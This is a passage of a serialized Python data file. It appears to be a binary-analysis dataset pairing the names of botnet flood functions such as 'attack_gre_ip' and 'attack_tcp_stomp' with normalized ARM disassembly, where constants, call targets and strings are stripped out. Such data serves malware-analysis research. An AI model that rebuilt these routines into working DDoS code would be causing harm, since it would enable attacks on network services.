ND~R1,R1,0\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nORR~R1,R1,R12,LSR0\nMOV~R0,R2,LSR0\nMOV~R3,0\nAND~R2,R2,0\nSTRB~R3,[R4,0]\nSTRB~R10,[R4,0]\nSTRB~R8,[R4,0]\nORR~R0,R0,R2,LSL0\nMOV~R2,R1,ASR0\nSTRB~R2,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nMLA~R3,R2,R3,R9\nLDR~R2,[SP,0]\nSTR~R2,[R4,0]\nSTRB~R1,[R4,0]\nLDR~R2,[R3,0]\nADD~R1,R4,0\nMOV~R12,R0,ASR0\nMOV~R3,0\nSTRB~R12,[R4,0]\nSTRB~R0,[R4,0]\nSTRB~R3,[R1,0]\nADD~R3,R3,0\nSTRB~R3,[R1,0]\nADD~R0,R4,0\nMOV~R7,LR,LSR0\nMOV~R3,0\nMOV~LR,0\nSTR~R2,[R4,0]\nSTRB~LR,[R0,0]\nSTRB~R3,[R0,0]\nLDRB~R3,[R4,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nADD~R1,R7,0\nMOV~R1,R1,LSL0\nMVN~R2,R3\nLDRB~R0,[R4,0]\nMOV~R2,R2,LSL0\nMOV~R12,R1,LSR0\nMOV~R3,R2,LSR0\nAND~R12,R12,0\nORR~R12,R12,R1,LSR0\nAND~R3,R3,0\nMOV~R2,R2,LSR0\nBIC~R0,R0,0\nADD~R5,R4,0\nORR~R2,R2,R3,LSL0\nORR~R0,R0,0\nMOV~R3,R12,ASR0\nSTRB~R0,[R4,0]\nSTRB~R3,[R5,0]\nMOVNE~R3,0\nMOV~R1,R2,ASR0\nSTRNEB~R3,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nSTRNEB~LR,[R5,0]\nSTRB~R1,[R5,0]\nSTRB~R12,[R5,0]\nSTRB~R2,[R5,0]\nSTRB~R10,[R5,0]\nSTRB~R8,[R5,0]\nBL~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nLDRNE~R3,[R4,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTR~R3,[R5,0]\nADD~R3,R7,0\nMOV~R3,R3,LSL0\nADD~R6,R4,0\nADD~R2,SP,0\nLDMIA~R2,{R2,R4}\nMOV~R1,R3,LSR0\nSTR~R0,[R5,0]\nAND~R1,R1,0\nAND~R0,R2,0\nORR~R1,R1,R3,LSR0\nMOV~LR,R2,LSR0\nMOV~R12,R4,LSR0\nAND~R2,R4,0\nLDR~R3,[SP,0]\nORR~R12,R12,R2,LSL0\nORR~LR,LR,R0,LSL0\nMOV~R0,LR,ASR0\nMOV~R4,R12,ASR0\nMOV~R2,R1,ASR0\nADD~R3,R3,0\nSTRB~R2,[R6,0]\nSTRB~R0,[R6,0]\nSTRB~R4,[R6,0]\nSTR~R3,[SP,0]\nSTRB~LR,[R6]\nSTRB~R12,[R6,0]\nSTRB~R1,[R6,0]\nLDR~R4,[SP,0]\nLDR~R5,[SP,0]\nCMP~R4,R5\nBLT~FOO\nMOV~R3,0\nB~FOO\nMOV~R10,0\nMLA~R2,R0,R10,R9\nLDR~R1,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R1,R0,LSL0]\nCMP~R3,0\nADD~R8,R5,R10\nADD~R6,R5,0\nADD~R7,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R10,R9\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR10\nORR~R2,R2,R4,LSRR10\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR10\nORR~R3,R3,R2,LSRR10\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R4,<STR>\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSUB~R2,R0,0\nMVN~R2,R2\nMOV~R1,R2,ASR0\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nSTRB~R1,[R6,0]\nSTRB~R2,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSTRB~R0,[R7,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nLDRNE~R3,[R5,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nADD~R1,SP,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,R8\nBL~FOO\nADD~R4,SP,0\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R1,R4\nADD~R0,R8,0\nMOV~R2,0\nBL~FOO\nADD~R1,R4,0\nADD~R0,R8,0\nMOV~R2,0\nBL~FOO\nLDR~R4,[SP,0]\nCMP~R4,0\nADDNE~R0,R7,0\nMOVNE~R1,R11\nBLNE~FOO\nMOV~R4,0\nMOV~R1,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nMOV~R1,0\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R6\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDRB~R3,[R7,0]\nLDRB~R2,[R7,0]\nMOV~R1,R7\nORR~R2,R3,R2,LSL0\nSTRB~R4,[R7,0]\nADD~R3,R11,0\nSTRB~R4,[R7,0]\nMOV~R0,R6\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R3,0\nMUL~R1,R2,R3\nLDR~R2,[R5,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nADD~R12,R1,R9\nMOV~R3,0\nSTRB~R0,[R7,0]\nSTR~R2,[R12,0]\nSTRB~R3,[R1,R9]\nSTRB~R4,[R12,0]\nSTRB~R4,[R12,0]\nSTRB~R4,[R12,0]\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R1,R5\nMOV~R12,0\nLDR~R0,[SP,0]\nADD~R2,R11,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R5,[SP,0]\nCMP~R0,R5\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p206
L1588L
tp207
a(S'attack_gre_ip'
p208
S'"STMFD~SP!,{R4-R11,LR}\nAND~R0,R0,0\nSUB~SP,SP,0\nMOV~R10,R1\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nMOV~R12,R0,LSL0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nMOV~R11,R12,LSR0\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R2,0\nMOV~R3,0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,R2\nMOV~R1,R5\nMOV~R9,R0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nLDR~R3,[R3]\nMOV~R2,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nSTR~R0,[SP,0]\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[SP,0]\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nMOV~R1,0\nLDR~R0,<STR>\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R4,[R1,R3,LSL0]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nMOV~LR,R9,LSL0\nLDRB~R3,[R4]\nADD~R12,LR,0\nMOV~R1,R12,LSR0\nAND~R1,R1,0\nBIC~R3,R3,0\nORR~R1,R1,R12,LSR0\nAND~R2,R11,0\nORR~R3,R3,0\nMOV~R0,R11,LSR0\nLDR~R5,[SP,0]\nORR~R0,R0,R2,LSL0\nSTRB~R3,[R4]\nMOV~R2,R1,ASR0\nSTRB~R2,[R4,0]\nLDR~R2,[SP,0]\nSTRB~R2,[R4,0]\nLDR~R3,[SP,0]\nCMP~R5,0\nSTRB~R3,[R4,0]\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nMLA~R2,R3,R2,R10\nSTRB~R1,[R4,0]\nMOV~R12,R0,ASR0\nADD~R1,R4,0\nMOV~R8,0\nMOV~R3,0\nSTRB~R12,[R4,0]\nSTRB~R0,[R4,0]\nSTRB~R3,[R1,0]\nSTRB~R8,[R1,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R4,0]\nSTR~R1,[R4,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nMOV~R7,LR,LSR0\nLDR~LR,[R2,0]\nSTRB~R3,[R4,0]\nADD~R1,R7,0\nLDRB~R0,[R4,0]\nMOV~R1,R1,LSL0\nMVN~R2,R11\nMOV~R2,R2,LSL0\nMOV~R12,R1,LSR0\nMOV~R3,R2,LSR0\nAND~R12,R12,0\nBIC~R0,R0,0\nORR~R12,R12,R1,LSR0\nAND~R3,R3,0\nORR~R0,R0,0\nMOV~R2,R2,LSR0\nADD~R5,R4,0\nSTRB~R0,[R4,0]\nORR~R2,R2,R3,LSL0\nMOV~R3,R12,ASR0\nSTRB~R3,[R5,0]\nLDR~R3,[SP,0]\nMOV~R1,R2,ASR0\nSTR~LR,[R4,0]\nSTRB~R1,[R5,0]\nSTRB~R3,[R5,0]\nLDR~R1,[SP,0]\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nSTRB~R12,[R5,0]\nSTRB~R2,[R5,0]\nSTRB~R1,[R5,0]\nSTRNEB~R8,[R5,0]\nBL~FOO\nLDR~R2,[SP,0]\nCMP~R2,0\nLDRNE~R3,[R4,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTR~R3,[R5,0]\nADD~R3,R7,0\nMOV~R3,R3,LSL0\nADD~R6,R4,0\nSTR~R0,[R5,0]\nLDR~R4,[SP,0]\nMOV~R1,R3,LSR0\nLDR~R5,[SP,0]\nAND~R1,R1,0\nAND~R0,R4,0\nORR~R1,R1,R3,LSR0\nMOV~LR,R4,LSR0\nAND~R2,R5,0\nLDR~R3,[SP,0]\nMOV~R12,R5,LSR0\nORR~R12,R12,R2,LSL0\nORR~LR,LR,R0,LSL0\nMOV~R0,LR,ASR0\nMOV~R4,R12,ASR0\nMOV~R2,R1,ASR0\nADD~R3,R3,0\nSTRB~R2,[R6,0]\nSTRB~R0,[R6,0]\nSTRB~R4,[R6,0]\nSTR~R3,[SP,0]\nSTRB~LR,[R6]\nSTRB~R12,[R6,0]\nSTRB~R1,[R6,0]\nLDR~R4,[SP,0]\nLDR~R1,[SP,0]\nCMP~R4,R1\nBLT~FOO\nMOV~R3,0\nB~FOO\nMOV~R8,0\nMLA~R2,R0,R8,R10\nLDR~R4,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R4,R0,LSL0]\nCMP~R3,0\nADD~R6,R5,R8\nADD~R7,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R8,R10\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR8\nORR~R2,R2,R4,LSRR8\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR8\nORR~R3,R3,R2,LSRR8\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R1,[SP,0]\nCMN~R1,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R4,<STR>\nCMP~R11,R4\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSUB~R2,R0,0\nMVN~R2,R2\nMOV~R1,R2,ASR0\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nSTRB~R1,[R6,0]\nSTRB~R2,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R7,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSTRB~R0,[R7,0]\nLDR~R4,[SP,0]\nCMP~R4,0\nLDRNE~R3,[R5,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nADDNE~R0,R7,0\nMOVNE~R1,R9\nBLNE~FOO\nMOV~R4,0\nMOV~R1,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nMOV~R1,0\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R6\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDRB~R3,[R7,0]\nLDRB~R2,[R7,0]\nMOV~R1,R7\nORR~R2,R3,R2,LSL0\nSTRB~R4,[R7,0]\nADD~R3,R9,0\nSTRB~R4,[R7,0]\nMOV~R0,R6\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R3,0\nMUL~R1,R2,R3\nLDR~R2,[R5,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nADD~R12,R1,R10\nMOV~R3,0\nSTRB~R0,[R7,0]\nSTR~R2,[R12,0]\nSTRB~R3,[R1,R10]\nSTRB~R4,[R12,0]\nSTRB~R4,[R12,0]\nSTRB~R4,[R12,0]\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R1,R5\nMOV~R12,0\nLDR~R0,[SP,0]\nADD~R2,R9,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R2,[SP,0]\nCMP~R0,R2\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p209
L1480L
tp210
a(S'attack_tcp_stomp'
p211
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nAND~R0,R0,0\nSTR~R1,[SP,0]\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,0\nMOV~R9,R0\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nMOV~R12,R0,LSL0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nMOV~R11,R12,LSR0\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R2,0\nMOV~R3,0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,R2\nMOV~R1,R5\nMOV~R8,R0\nMOV~R0,R4\nBL~FOO\nMOV~R3,R0\nAND~R3,R3,0\nMOV~R1,0\nMOV~R0,0\nMOV~R2,0\nSTR~R3,[SP,0]\nBL~FOO\nCMN~R0,0\nMOV~R10,R0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nBNE~FOO\nMOV~R0,R10\nBL~FOO\nB~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nMOV~R7,R0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R1,0\nORR~R2,R0,0\nMOV~R0,R7\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R5,0\nMLA~R2,R3,R5,R2\nMOV~R3,0\nSTRB~R3,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R4,[R2,0]\nCMP~R3,0\nSTRHI~R4,[SP,0]\nBHI~FOO\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R1,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R5,R1\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR5\nORR~R2,R2,R4,LSRR5\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR5\nORR~R3,R3,R2,LSRR5\nORR~R3,R3,R1\nSTR~R3,[SP,0]\nLDR~R3,<STR>\nCMP~R11,R3\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[SP,0]\nSTRB~R0,[SP,0]\nB~FOO\nAND~R2,R11,0\nMOV~R3,R11,LSR0\nORR~R3,R3,R2,LSL0\nMOV~R2,R3,ASR0\nSTRB~R2,[SP,0]\nSTRB~R3,[SP,0]\nADD~R1,SP,0\nMOV~R2,0\nMOV~R0,R7\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R5,R0\nMOV~R12,0\nSTR~R12,[SP,0]\nADD~R12,SP,0\nMOV~R2,0\nSTR~R12,[SP]\nADD~R1,SP,0\nADD~R12,SP,0\nMOV~R3,0\nMOV~R0,R10\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,R0\nCMN~R2,0\nMOV~R0,0\nBEQ~FOO\nLDR~R4,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R2,0\nMOVLS~R3,0\nCMP~R3,R0\nBEQ~FOO\nLDRB~R3,[SP,0]\nLDRB~R1,[SP,0]\nLDRB~R12,[SP,0]\nLDRB~R2,[SP,0]\nORR~R3,R3,R1,LSL0\nORR~LR,R12,R2,LSL0\nCMP~LR,R3\nBNE~FOO\nLDRB~R2,[SP,0]\nAND~R3,R2,0\nCMP~R3,0\nBNE~FOO\nLDR~R5,[SP,0]\nMOV~R12,R5,LSL0\nSTR~R4,[R9,R12]\nLDR~R1,[R6,0]\nAND~R3,R1,0\nAND~R2,R1,0\nMOV~R3,R3,LSR0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R1,LSR0\nADD~R12,R9,R12\nORR~R3,R3,R2\nSTR~R3,[R12,0]\nLDR~R1,[R6,0]\nAND~R3,R1,0\nAND~R2,R1,0\nMOV~R3,R3,LSR0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R1,LSR0\nORR~R3,R3,R2\nSTR~R3,[R12,0]\nLDR~R3,[R6]\nMOV~R3,R3,LSR0\nMOV~R1,R3,ASR0\nMOV~R2,LR,ASR0\nADD~R4,R8,0\nSTRB~R2,[R12,0]\nSTRB~R1,[R12,0]\nSTRB~R3,[R12,0]\nSTRB~LR,[R12,0]\nMOV~R0,R4\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R5,LSL0]\nLDR~R5,[R1,R3,LSL0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nLDRB~R1,[R5]\nMOV~R4,R4,LSL0\nBIC~R1,R1,0\nLDR~R2,[SP,0]\nMOV~R3,R4,LSR0\nORR~R1,R1,0\nLDR~R12,[SP,0]\nAND~R3,R3,0\nSTRB~R1,[R5]\nMOV~R4,R4,LSR0\nLDR~R1,[SP,0]\nORR~R4,R4,R3,LSL0\nMOV~R0,R2,LSR0\nAND~R2,R2,0\nMOV~R3,R4,ASR0\nCMP~R12,0\nORR~R0,R0,R2,LSL0\nSTRB~R1,[R5,0]\nSTRB~R3,[R5,0]\nMOV~R2,R0,ASR0\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nSTRB~R2,[R5,0]\nMOVNE~R3,0\nLDR~R2,[SP,0]\nSTRNEB~R3,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nSTRB~R2,[R5,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R5,0]\nLDR~R1,[SP,0]\nLDR~R3,[R9,R1,LSL0]\nSTRB~R4,[R5,0]\nSTRB~R0,[R5,0]\nSTR~R3,[R5,0]\nADD~R1,R9,R1,LSL0\nLDRB~R2,[R1,0]\nLDRB~R3,[R1,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nADD~R6,R5,0\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDRB~R3,[R6,0]\nLDR~R2,[R1,0]\nORR~R3,R3,0\nLDRB~R12,[R1,0]\nLDRB~R0,[R1,0]\nSTR~R2,[R6,0]\nLDR~LR,[R1,0]\nSTRB~R3,[R6,0]\nLDRB~R3,[R6,0]\nLDRB~R2,[R6,0]\nORR~R0,R0,R12,LSL0\nBIC~R3,R3,0\nMOV~R1,R0,ASR0\nORR~R3,R3,0\nORR~R2,R2,0\nSTRB~R1,[R6,0]\nSTRB~R3,[R6,0]\nSTRB~R2,[R6,0]\nSTR~LR,[R6,0]\nSTRB~R0,[R6,0]\nBL~FOO\nLDR~R12,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R12,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nLDR~R12,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R12,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nLDR~R12,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R12,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R6,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nSTRB~R2,[R6,0]\nADD~R0,R5,0\nMOV~R1,R8\nBL~FOO\nB~FOO\nTST~R2,0\nBNE~FOO\nBL~FOO\nRSB~R0,R5,R0\nCMP~R0,0\nBLE~FOO\nMOV~R0,R7\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R3,R2\nBLT~FOO\nMOV~R3,0\nB~FOO\nLDR~R3,[SP,0]\nLDR~R12,[SP,0]\nLDR~R4,[R3,R0,LSL0]\nLDR~R3,<STR>\nCMP~R12,R3\nADD~R5,R4,0\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R4,0]\nSTRB~R0,[R4,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nADD~R0,R4,0\nMOV~R1,R8\nBLNE~FOO\nMOV~R1,0\nSTRB~R6,[R4,0]\nSTRB~R6,[R4,0]\nMOV~R0,R4\nBL~FOO\nLDR~R1,[SP,0]\nADD~R1,R9,R1,LSL0\nLDR~R2,[R1,0]\nMOV~R12,R2,LSL0\nMOV~R3,R12,LSR0\nAND~R3,R3,0\nORR~R3,R3,R12,LSR0\nADD~R2,R2,0\nSTR~R2,[R1,0]\nSTR~R3,[R5,0]\nLDR~R1,[R1,0]\nADD~R3,R8,0\nMOV~R1,R1,LSL0\nMOV~LR,R3,LSL0\nMOV~R12,R1,LSR0\nMOV~R2,LR,LSR0\nAND~R12,R12,0\nORR~R12,R12,R1,LSR0\nMOV~LR,LR,LSR0\nMOV~R1,R0,ASR0\nAND~R2,R2,0\nSTRB~R1,[R4,0]\nSTRB~R0,[R4,0]\nORR~R2,LR,R2,LSL0\nSTR~R12,[R5,0]\nMOV~R1,R5\nSTRB~R6,[R5,0]\nSTRB~R6,[R5,0]\nMOV~R0,R4\nBL~FOO\nLDR~R2,[SP,0]\nLDR~R12,[SP,0]\nMOV~R3,0\nMLA~R12,R2,R3,R12\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R5,0]\nLDR~R3,[R4,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nSTRB~R3,[R12,0]\nMOV~R1,R4\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R0,R10\nMOV~R12,0\nADD~R2,R8,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R2,[SP,0]\nCMP~R0,R